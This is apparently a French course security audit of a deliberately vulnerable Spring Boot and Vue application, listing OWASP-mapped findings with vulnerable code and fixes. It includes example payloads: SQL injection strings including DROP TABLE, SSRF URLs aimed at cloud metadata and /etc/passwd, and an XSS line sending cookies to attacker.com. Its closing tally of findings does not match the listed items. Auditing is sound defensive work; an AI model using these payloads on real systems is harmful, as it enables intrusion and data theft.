# Audit de sécurité : vulnérabilités identifiées

## Méthodologie

L'audit a été réalisé en suivant les étapes du cours :
1. Exploration du code source et recherche de commentaires signalant des problèmes (🔴)
2. Identification des patterns dangereux (injection, secrets, permissions excessives)
3. Analyse de la configuration (Docker, Spring Boot, Nginx)
4. Mapping avec les catégories OWASP Top 10 2025

---

## 🔴 CRITIQUE : vulnérabilités bloquantes pour le déploiement

### VULN-01 : injection SQL dans la recherche de projets

| Champ | Valeur |
|-------|--------|
| **Réf** | A03-01 |
| **Fichier** | `backend/src/main/java/com/devfolio/controller/SearchController.java:23` |
| **Criticité** | 🔴 CRITIQUE |
| **Exploitabilité** | Immédiate : paramètre `q` concaténé directement dans la requête SQL |
| **Impact** | Lecture/modification/suppression de toutes les données de la BDD |

**Code vulnérable :**
```java
String sql = "SELECT * FROM projects WHERE title LIKE '%" + q + "%' " +
             "OR description LIKE '%" + q + "%'";
```

**Payload d'exemple :** `q=' OR '1'='1` → retourne tous les projets
**Payload destructeur :** `q='; DROP TABLE projects; --`

**Correction :** Utiliser les requêtes paramétrées de JPA (`@Query` avec `:q`).

---

### VULN-02 : SSRF via import GitHub

| Champ | Valeur |
|-------|--------|
| **Réf** | A10-02 |
| **Fichier** | `backend/src/main/java/com/devfolio/controller/ProjectController.java:63` |
| **Criticité** | 🔴 CRITIQUE |
| **Exploitabilité** | Immédiate : aucune validation du domaine |
| **Impact** | Accès aux services internes, métadonnées cloud, fichiers locaux |

**Code vulnérable :**
```java
URL url = new URL(githubUrl); // aucune validation du domaine
String content = new String(url.openStream().readAllBytes());
```

**Payload :** `githubUrl=http://169.254.169.254/latest/meta-data/` (AWS metadata)

**Correction :** Valider le domaine (whitelist `github.com`), bloquer les IP privées, limiter les protocoles à HTTPS.

---

### VULN-03 : SSRF via avatar URL

| Champ | Valeur |
|-------|--------|
| **Réf** | A10-01 |
| **Fichier** | `backend/src/main/java/com/devfolio/controller/AvatarController.java:25` |
| **Criticité** | 🔴 CRITIQUE |
| **Exploitabilité** | Immédiate : aucune validation |
| **Impact** | Scan du réseau interne, accès aux métadonnées cloud, lecture de fichiers |

**Payloads :**
- `url=http://169.254.169.254/latest/meta-data/` (AWS)
- `url=http://localhost:8080/actuator/env` (services internes)
- `url=file:///etc/passwd` (fichiers locaux)

**Correction :** Whitelist de domaines autorisés, bloquer les IP privées (RFC 1918), protocoles limités à HTTPS.

---

### VULN-04 : JWT sans vérification de signature (alg:none)

| Champ | Valeur |
|-------|--------|
| **Réf** | A07-01 |
| **Fichier** | `backend/src/main/java/com/devfolio/service/JwtService.java:44-53` |
| **Criticité** | 🔴 CRITIQUE |
| **Exploitabilité** | Immédiate : un attaquant peut forger un token admin |
| **Impact** | Usurpation d'identité, élévation de privilèges |

**Code vulnérable :**
```java
// Fallback qui parse sans vérifier la signature
String[] parts = token.split("\\.");
if (parts.length == 2 || (parts.length == 3 && parts[2].isEmpty())) {
    String payload = new String(Base64.getDecoder().decode(parts[1]));
    return parseUnsignedClaims(payload);
}
```

**Correction :** Supprimer le fallback, n'accepter que les tokens signés avec vérification stricte.

---

### VULN-05 : JWT sans expiration

| Champ | Valeur |
|-------|--------|
| **Réf** | A07-02 |
| **Fichier** | `backend/src/main/java/com/devfolio/service/JwtService.java:29` |
| **Criticité** | 🔴 CRITIQUE |
| **Exploitabilité** | Un token volé est valide indéfiniment |
| **Impact** | Accès persistant en cas de fuite de token |

**Correction :** Ajouter `.setExpiration()` avec une durée raisonnable (ex: 24h).

---

### VULN-06 : contrôle d'accès inopérant (tout est permitAll)

| Champ | Valeur |
|-------|--------|
| **Réf** | A01-01, A01-03, A01-05 |
| **Fichier** | `backend/src/main/java/com/devfolio/config/SecurityConfig.java:35-43` |
| **Criticité** | 🔴 CRITIQUE |
| **Exploitabilité** | Immédiate : aucun endpoint n'est protégé |
| **Impact** | Accès non autorisé à toutes les ressources, y compris admin |

**Code vulnérable :**
```java
.requestMatchers("/api/admin/**").permitAll()  // Admin sans auth
.requestMatchers("/actuator/**").permitAll()    // Actuator sans auth
.anyRequest().permitAll()                       // Tout le reste aussi
```

**Correction :** Implémenter un filtre JWT, restreindre `/api/admin/**` au rôle ADMIN, exiger l'auth sur les routes sensibles.

---

### VULN-06b : absence de filtre d'authentification JWT

| Champ | Valeur |
|-------|--------|
| **Réf** | A01-01, A07-01 |
| **Fichier** | Aucun filtre JWT n'existe dans `config/` |
| **Criticité** | 🔴 CRITIQUE |
| **Exploitabilité** | Immédiate : sans filtre, même avec `authenticated()` dans SecurityConfig, les requêtes ne sont jamais authentifiées |
| **Impact** | Bloquant pour VULN-06, VULN-11, VULN-12 : toute restriction d'accès est inopérante sans ce filtre |

**Problème :** Le projet génère et valide des tokens JWT (`JwtService`) mais n'a **aucun filtre Spring Security** pour extraire le token du header `Authorization` et peupler le `SecurityContext`. Sans ce filtre, remplacer `permitAll()` par `authenticated()` bloquerait tout, y compris les utilisateurs légitimes.

**Correction :** Créer un `JwtAuthenticationFilter` étendant `OncePerRequestFilter` qui :
1. Lit le header `Authorization: Bearer <token>`
2. Valide le token via `JwtService.validateToken()`
3. Extrait les claims (subject, role, userId) et crée un `UsernamePasswordAuthenticationToken`
4. Le place dans `SecurityContextHolder`
5. Est enregistré via `.addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class)` dans `SecurityConfig`

```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    @Autowired private JwtService jwtService;

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {
        String header = request.getHeader("Authorization");
        if (header != null && header.startsWith("Bearer ")) {
            try {
                Claims claims = jwtService.validateToken(header.substring(7));
                String role = claims.get("role", String.class);
                var auth = new UsernamePasswordAuthenticationToken(
                        claims.getSubject(), null,
                        List.of(new SimpleGrantedAuthority("ROLE_" + role)));
                auth.setDetails(claims.get("userId", Integer.class).longValue());
                SecurityContextHolder.getContext().setAuthentication(auth);
            } catch (JwtException | IllegalArgumentException e) {
                SecurityContextHolder.clearContext();
            }
        }
        chain.doFilter(request, response);
    }
}
```

---

### VULN-07 : Log4Shell (CVE-2021-44228)

| Champ | Valeur |
|-------|--------|
| **Réf** | A06-01 |
| **Fichier** | `backend/pom.xml:49` |
| **Criticité** | 🔴 CRITIQUE |
| **Exploitabilité** | Immédiate si les entrées utilisateur sont loggées |
| **Impact** | Exécution de code arbitraire à distance (RCE) |

**Code vulnérable :**
```xml
<version>2.14.1</version>  <!-- Vulnérable à Log4Shell -->
```

**Correction :** Mettre à jour vers Log4j ≥ 2.17.1 ou supprimer la dépendance (Spring Boot utilise Logback par défaut).

---

## 🟠 HAUTE : vulnérabilités graves mais nécessitant plus de contexte

### VULN-07b : mots de passe exposés dans les réponses JSON

| Champ | Valeur |
|-------|--------|
| **Réf** | A02-01 (conséquence) |
| **Fichier** | `backend/src/main/java/com/devfolio/model/User.java:33` |
| **Criticité** | 🟠 HAUTE |
| **Impact** | Les hashes de mots de passe sont renvoyés dans les réponses API (`/api/admin/users`, `/api/users/{id}`, login) |

**Problème :** Le getter `getPassword()` de `User` n'a pas d'annotation `@JsonIgnore` ou `@JsonProperty(access = WRITE_ONLY)`. Spring Boot sérialise le champ `password` dans toutes les réponses JSON.

**Correction :**
```java
@JsonProperty(access = JsonProperty.Access.WRITE_ONLY) // jamais lu, seulement écrit (login/register)
public String getPassword() { return password; }
```

Ou plus simple, `@JsonIgnore` sur le getter. L'admin view côté frontend affiche aussi ces hashes (VULN-29).

---

### VULN-08 : mots de passe hashés en MD5 sans sel

| Champ | Valeur |
|-------|--------|
| **Réf** | A02-01 |
| **Fichiers** | `SecurityConfig.java:53-71`, `AuthService.java:38-46` |
| **Criticité** | 🟠 HAUTE |
| **Impact** | Les hashes MD5 sont cassables par rainbow tables en secondes |

**Correction :** Remplacer MD5 par BCrypt (déjà disponible via Spring Security).

---

### VULN-09 : XSS stocké via le champ bio

| Champ | Valeur |
|-------|--------|
| **Réf** | A03-02 |
| **Fichier** | `frontend/src/views/ProfileView.vue:35` |
| **Criticité** | 🟠 HAUTE |
| **Impact** | Vol de tokens JWT, actions au nom de l'utilisateur |

**Code vulnérable :**
```html
<div class="bio" v-html="user.bio"></div>
```

**Payload :** `<img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)">`

**Correction :** Remplacer `v-html` par `{{ user.bio }}` (échappement automatique par Vue) ou sanitiser côté serveur.

---

### VULN-10 : secrets hardcodés dans le dépôt

| Champ | Valeur |
|-------|--------|
| **Réf** | A02-02, A02-03, A02-05, A02-06, DEV-07 |
| **Fichiers** | `.env`, `docker-compose.yml`, `application.properties` |
| **Criticité** | 🟠 HAUTE |
| **Impact** | Compromission totale si le dépôt est public |

**Secrets identifiés :**
- `DB_PASSWORD=root`
- `JWT_SECRET=secret123` (+ fallback `hardcoded-jwt-secret-do-not-use`)
- `ADMIN_PASSWORD=admin123`
- `SMTP_PASSWORD=MonMotDePasseGmail2024!`
- `AWS_ACCESS_KEY` / `AWS_SECRET_KEY`
- `.env` commité car absent du `.gitignore`

**Correction :** Ajouter `.env` au `.gitignore`, utiliser des variables d'environnement ou un vault, révoquer les credentials compromis.

---

### VULN-11 : élévation de privilèges via modification de rôle

| Champ | Valeur |
|-------|--------|
| **Réf** | A01-04 |
| **Fichier** | `backend/src/main/java/com/devfolio/controller/UserController.java:37` |
| **Criticité** | 🟠 HAUTE |
| **Impact** | N'importe quel utilisateur peut se promouvoir ADMIN |

**Code vulnérable :**
```java
user.setRole(updated.getRole()); // l'appelant peut s'auto-promouvoir ADMIN
```

**Correction :** Exclure le champ `role` de la mise à jour côté utilisateur, ou vérifier les permissions.

---

### VULN-12 : IDOR sur les projets et profils

| Champ | Valeur |
|-------|--------|
| **Réf** | A01-01, A01-02, A01-04 |
| **Fichiers** | `ProjectController.java:27,39,56`, `UserController.java:33` |
| **Criticité** | 🟠 HAUTE |
| **Impact** | Lecture/modification/suppression de ressources d'autrui |

**Correction :** Vérifier que l'utilisateur authentifié est le propriétaire de la ressource.

---

### VULN-13 : CORS ouvert à tous

| Champ | Valeur |
|-------|--------|
| **Réf** | A01-05 |
| **Fichier** | `SecurityConfig.java:27-33` |
| **Criticité** | 🟠 HAUTE |
| **Impact**** | Tout site web peut faire des requêtes à l'API au nom d'un utilisateur |

**Correction :** Limiter les origines au domaine du frontend.

---

### VULN-14 : CSRF désactivé

| Champ | Valeur |
|-------|--------|
| **Réf** | A05-03 |
| **Fichier** | `SecurityConfig.java:24` |
| **Criticité** | 🟠 HAUTE |
| **Impact** | Attaques CSRF possibles sur les requêtes modifiantes |

**Correction :** Réactiver CSRF ou s'assurer que l'API est purement stateless avec tokens Bearer.

---

### VULN-15 : injection dans les logs (Log Injection)

| Champ | Valeur |
|-------|--------|
| **Réf** | A03-04 |
| **Fichier** | `AuthController.java:43` |
| **Criticité** | 🟠 HAUTE |
| **Impact**** | Falsification des logs, masquage d'attaques |

**Code vulnérable :**
```java
log.info("Login attempt for user: " + username);
```

**Correction :** Sanitiser les entrées avant logging, ou utiliser des paramètres de log structurés.

---

### VULN-16 : mots de passe loggés en clair

| Champ | Valeur |
|-------|--------|
| **Réf** | A09-01 |
| **Fichiers** | `AuthController.java:46`, `AuthService.java:29` |
| **Criticité** | 🟠 HAUTE |
| **Impact** | Les mots de passe sont lisibles dans les fichiers de log |

**Correction :** Ne jamais logger de mots de passe, même en DEBUG.

---

## 🟡 MOYENNE : problèmes importants mais moins directement exploitables

### VULN-17 : actuator entièrement exposé

| Champ | Valeur |
|-------|--------|
| **Réf** | A05-01, A05-02 |
| **Fichier** | `application.properties:20-24` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | Fuite de configuration (`/actuator/env`), heap dump (`/actuator/heapdump`), arrêt du serveur (`/actuator/shutdown`) |

**Correction :** Limiter à `health,info`, désactiver `env`, `heapdump`, `shutdown`.

---

### VULN-18 : stacktraces exposées dans les réponses

| Champ | Valeur |
|-------|--------|
| **Réf** | DEV-11 |
| **Fichier** | `application.properties:28-30` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | Divulgation de la structure interne de l'application |

**Correction :** `server.error.include-stacktrace=never`

---

### VULN-19 : debug activé en production

| Champ | Valeur |
|-------|--------|
| **Réf** | A05-06 |
| **Fichiers** | `docker-compose.yml:36`, `application.properties:34-35` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | Verbosité excessive, fuite d'informations dans les logs |

**Correction :** Niveau `WARN` en production, `DEBUG` uniquement en dev.

---

### VULN-20 : port de debug JVM exposé

| Champ | Valeur |
|-------|--------|
| **Réf** | DEV-08 |
| **Fichier** | `backend/Dockerfile:22,25` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | Attachement distant au processus Java, exécution de code arbitraire |

**Code vulnérable :**
```dockerfile
EXPOSE 8080 5005
CMD ["java", "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005", "-jar", "app.jar"]
```

**Correction :** Supprimer le port 5005 et l'argument `-agentlib:jdwp`.

---

### VULN-21 : aucune validation de complexité des mots de passe

| Champ | Valeur |
|-------|--------|
| **Réf** | A04-04 |
| **Fichier** | `AuthService.java:24` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | Mots de passe triviaux possibles |

**Correction :** Ajouter des règles de complexité (longueur minimale, caractères variés).

---

### VULN-22 : énumération d'utilisateurs

| Champ | Valeur |
|-------|--------|
| **Réf** | A04-02 |
| **Fichier** | `AuthController.java:51-53` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | Un attaquant peut déterminer quels emails existent |

**Correction :** Message générique : "Identifiants incorrects".

---

### VULN-23 : token de reset dans l'URL

| Champ | Valeur |
|-------|--------|
| **Réf** | A04-03 |
| **Fichier** | `AuthController.java:83` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | Token visible dans les logs serveur et l'historique navigateur |

**Correction :** Envoyer le token par email, pas dans l'URL de réponse.

---

### VULN-24 : JWT stocké dans localStorage

| Champ | Valeur |
|-------|--------|
| **Réf** | A07-03 |
| **Fichier** | `frontend/src/stores/auth.js:6,14` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | Accessible par tout script JS de la page (XSS → vol de token) |

**Correction :** Utiliser un cookie HttpOnly + Secure à la place.

---

### VULN-25 : pas d'invalidation serveur des tokens JWT

| Champ | Valeur |
|-------|--------|
| **Réf** | A07-05 |
| **Fichier** | `frontend/src/stores/auth.js:17-22` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | Un token volé reste valide même après "déconnexion" |

**Correction :** Implémenter une blacklist de tokens côté serveur.

---

### VULN-26 : pas de Content-Security-Policy

| Champ | Valeur |
|-------|--------|
| **Réf** | A05-05 |
| **Fichier** | `frontend/index.html:6` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | Pas de protection contre l'injection de scripts |

**Correction :** Ajouter l'en-tête CSP dans Nginx.

---

### VULN-27 : scripts CDN sans SRI

| Champ | Valeur |
|-------|--------|
| **Réf** | A08-01 |
| **Fichier** | `frontend/index.html:8-9` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | Si le CDN est compromis, du code malveillant est exécuté |

**Correction :** Ajouter les attributs `integrity` et `crossorigin="anonymous"`.

---

### VULN-28 : protection admin côté client uniquement

| Champ | Valeur |
|-------|--------|
| **Réf** | A01-06 |
| **Fichiers** | `frontend/src/router/index.js:16-23`, `AdminView.vue:6` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | Contournable via DevTools (modification de localStorage) |

**Correction :** La protection doit être côté serveur (voir VULN-06).

---

### VULN-29 : hashes MD5 affichés dans l'UI admin

| Champ | Valeur |
|-------|--------|
| **Réf** | A01-03 (conséquence) |
| **Fichier** | `frontend/src/views/AdminView.vue:39` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | Facilite le cassage des mots de passe |

**Correction :** Ne jamais exposer les hashes dans l'UI.

---

### VULN-30 : axios vulnérable (CVE-2021-3749)

| Champ | Valeur |
|-------|--------|
| **Réf** | A06-02 |
| **Fichier** | `frontend/package.json:15` |
| **Criticité** | 🟡 MOYENNE |
| **Impact** | SSRF via la fonction `axios.get()` |

**Correction :** Mettre à jour axios vers ≥ 0.22.0.

---

## 🔵 BASSE : mauvaises pratiques et risques acceptables temporairement

### VULN-31 : conteneur backend tourne en root

| Champ | Valeur |
|-------|--------|
| **Réf** | DEV-08 |
| **Fichier** | `backend/Dockerfile:16` |
| **Criticité** | 🔵 BASSE |
| **Impact** | Si le conteneur est compromis, l'attaquant a les droits root |

**Correction :** Ajouter `USER nobody` ou un utilisateur dédié.

---

### VULN-32 : image Docker complète au lieu d'alpine/JRE

| Champ | Valeur |
|-------|--------|
| **Réf** | DEV-07 |
| **Fichier** | `backend/Dockerfile:13` |
| **Criticité** | 🔵 BASSE |
| **Impact** | Surface d'attaque plus large, image plus lourde |

**Correction :** Utiliser `eclipse-temurin:21-jre-alpine`.

---

### VULN-33 : pas de .dockerignore

| Champ | Valeur |
|-------|--------|
| **Réf** | DEV-09 |
| **Fichier** | `backend/Dockerfile:19` |
| **Criticité** | 🔵 BASSE |
| **Impact** | Fichiers sensibles (`.env`, `target/`) copiés dans l'image |

**Correction :** Créer un `.dockerignore` excluant `.env`, `target/`, etc.

---

### VULN-34 : pas de réseau Docker isolé

| Champ | Valeur |
|-------|--------|
| **Réf** | DEV-05 |
| **Fichier** | `docker-compose.yml:47` |
| **Criticité** | 🔵 BASSE |
| **Impact** | Les conteneurs peuvent communiquer librement entre eux |

**Correction :** Déclarer des réseaux séparés (frontend-backend, backend-db).

---

### VULN-35 : MariaDB exposé sur 0.0.0.0

| Champ | Valeur |
|-------|--------|
| **Réf** | DEV-03 |
| **Fichier** | `docker-compose.yml:8` |
| **Criticité** | 🔵 BASSE (en dev) / 🟠 HAUTE (en prod) |
| **Impact** | Base de données accessible depuis Internet |

**Correction :** Exposer uniquement sur `127.0.0.1:3306:3306` ou ne pas exposer le port.

---

### VULN-36 : pas de compte applicatif BDD séparé

| Champ | Valeur |
|-------|--------|
| **Réf** | DEV-04, A05-04 |
| **Fichiers** | `docker-compose.yml:11`, `database/init.sql:5` |
| **Criticité** | 🔵 BASSE |
| **Impact** | L'application a les droits root sur la base |

**Correction :** Créer un utilisateur avec privilèges minimaux sur `devfolio` uniquement.

---

### VULN-37 : HTTP uniquement, pas de HTTPS

| Champ | Valeur |
|-------|--------|
| **Réf** | A02-04 |
| **Fichiers** | `frontend/nginx.conf`, `frontend/Dockerfile:16` |
| **Criticité** | 🔵 BASSE (demo) / 🟠 HAUTE (prod) |
| **Impact** | Trafic en clair, interceptable |

**Correction :** Configurer TLS via Nginx + certificat.

---

### VULN-38 : pas de rotation des logs

| Champ | Valeur |
|-------|--------|
| **Réf** | A09-04 |
| **Fichier** | `application.properties:37` |
| **Criticité** | 🔵 BASSE |
| **Impact** | Les logs peuvent remplir le disque |

**Correction :** Configurer la rotation (logback-spring.xml).

---

### VULN-39 : échecs de connexion non loggés

| Champ | Valeur |
|-------|--------|
| **Réf** | A09-02 |
| **Fichier** | `AuthController.java:57` |
| **Criticité** | 🔵 BASSE |
| **Impact** | Impossible de détecter des attaques brute force |

**Correction :** Logger les échecs (sans le mot de passe).

---

### VULN-40 : pas de rate limiting sur le login

| Champ | Valeur |
|-------|--------|
| **Réf** | A04-01 |
| **Fichier** | `AuthController.java:37` |
| **Criticité** | 🔵 BASSE (demo) / 🟡 MOYENNE (prod) |
| **Impact** | Brute force possible |

**Correction :** Implémenter un rate limiter (ex: Bucket4j, Spring Security rate limiting).

---

### VULN-41 : mot de passe fallback en clair si MD5 échoue

| Champ | Valeur |
|-------|--------|
| **Réf** | (dans AuthService) |
| **Fichier** | `AuthService.java:44-45` |
| **Criticité** | 🔵 BASSE |
| **Impact** | En cas d'erreur, le mot de passe est stocké en clair |

**Correction :** Lever une exception au lieu de retourner l'input en clair.

---

### VULN-42 : tous les comptes partagent le même mot de passe

| Champ | Valeur |
|-------|--------|
| **Réf** | A02-06 |
| **Fichier** | `database/init.sql:39` |
| **Criticité** | 🔵 BASSE |
| **Impact** | Un seul mot de passe à casser pour tous les comptes |

**Correction :** Mots de passe uniques et complexes pour chaque compte.

---

### VULN-43 : données confidentielles dans les projets de test

| Champ | Valeur |
|-------|--------|
| **Réf** | (données de test) |
| **Fichier** | `database/init.sql:44` |
| **Criticité** | 🔵 BASSE |
| **Impact** | "Projet Secret" avec données NDA visibles en BDD |

**Correction :** Supprimer les données de test sensibles.

---

### VULN-44 : `spring.jpa.hibernate.ddl-auto=update` en production

| Champ | Valeur |
|-------|--------|
| **Réf** | A05 (Security Misconfiguration) |
| **Fichier** | `application.properties:8` |
| **Criticité** | 🔵 BASSE (demo) / 🟠 HAUTE (prod) |
| **Impact** | Risque d'altération automatique du schéma de base de données au démarrage (ajout/suppression de colonnes) |

**Correction :** Utiliser `ddl-auto=validate` en production et gérer les migrations avec Flyway ou Liquibase.

---

### VULN-45 : pas de healthcheck Docker

| Champ | Valeur |
|-------|--------|
| **Réf** | (docker-compose) |
| **Fichier** | `docker-compose.yml:18` |
| **Criticité** | 🔵 BASSE |
| **Impact** | Pas de redémarrage automatique en cas de panne |

**Correction :** Ajouter des healthchecks pour chaque service.

---

## Récapitulatif par criticité

| Criticité | Nombre |
|-----------|--------|
| 🔴 CRITIQUE | 8 |
| 🟠 HAUTE | 10 |
| 🟡 MOYENNE | 14 |
| 🔵 BASSE | 15 |
| **Total** | **47** |
